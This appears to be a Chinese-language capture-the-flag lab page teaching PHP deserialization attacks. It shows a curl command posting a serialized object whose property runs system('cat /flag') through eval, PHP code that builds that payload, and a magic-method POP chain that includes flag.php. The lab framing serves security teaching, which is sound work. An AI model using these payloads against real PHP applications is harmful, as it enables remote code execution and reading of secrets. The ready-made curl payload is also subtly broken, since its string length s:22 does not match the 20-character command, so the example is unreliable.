Level 7 · 实例化和反序列化 引导★★ 反序列化基础漏洞原理

目标:页面已经演示了「实例化」和「反序列化」创建对象的差别——通过 POST o 提交你构造的序列化串,让 backdoor() 执行你指定的命令,读出 flag。

本关知识点

实例化(new FLAG())创建对象时,属性值来自类定义,改不了;而 unserialize($str) 是按字符串「还原」对象——字符串可控,对象的属性就可控。 页面演示里那串与默认命令不同的序列化串,就是这个原理。

Level7/index.php黄色行为关键代码
本关接收参数:POST o 内容:序列化字符串(建议 URL 编码)
偏好命令行?等价的 curl:
curl -sX POST --data-urlencode 'o=O:4:"FLAG":1:{s:12:"flag_command";s:22:"system('cat /flag');";}' http://localhost/Level7/
  • HackBar(浏览器插件):勾选 Post data,填 o=... Execute;
  • F12 控制台:fetch('/',{method:'POST',body:'o='+encodeURIComponent(payload)});
  • payload 里有不可见字符(%00)时务必 URL 编码——第 6 关会讲到。
页面最后:提交的 o 被 unserialize() 还原成对象,紧接着调用 ->backdoor()。所以你要控制的,是这个被还原对象的属性。
backdoor() 执行 eval($this->flag_command)。 flag_command 是 public 属性——反序列化时它完全由你的字符串决定。 本地写一个同结构 FLAG 类、改掉 flag_command、serialize 一下试试。
flag 在 flag.php:让命令变成 system('cat /flag');(Docker 环境)或 include flag.php。 参考 Level 7 页面上的演示串格式,注意长度值 s:XX 要和内容一致。

思路

反序列化 = 按字符串「还原」对象,属性值完全由字符串决定 → flag_command 可控 → eval 执行任意 PHP 代码。

EXP

class FLAG{
    public $flag_command = "system('cat /flag');";
}
echo urlencode(serialize(new FLAG()));
// o=O%3A4%3A%22FLAG%22%3A1%3A%7Bs%3A12%3A%22flag_command%22%3Bs%3A19%3A%22system(...)%22%3B%7D

链子

INIT(__wakeup, echo $name) → 触发 B(__toString) → ($this->b)() 触发 A(__invoke) → include $this->a

EXP

class A { public $a = 'flag.php'; }
class B { public $b; }
class INIT { public $name; }
$b = new B(); $b->b = new A();
$i = new INIT(); $i->name = $b;
echo urlencode(serialize($i));
